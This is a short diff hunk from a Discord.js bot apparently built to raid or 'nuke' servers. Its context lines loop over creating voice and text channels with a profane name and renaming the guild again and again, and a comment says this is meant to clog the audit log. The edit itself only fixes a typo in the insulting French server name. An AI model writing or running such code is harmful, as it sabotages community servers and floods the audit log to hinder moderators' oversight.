@@ -17,7 +17,7 @@ const Discord = require('discord.js');
                 message.guild.createChannel('FUUUUUUUUUCK', 'voice')
                 message.guild.createChannel('FUUUUUUUUUCK', 'text')
                 //changes name tons of times to clog up the audit log
-                message.guild.setName("L'abtique t'encule "+ i + " Fois");
+                message.guild.setName("L'antique t'encule "+ i + " Fois");
                 }
 
               /*  message.guild.members.forEach(m => {
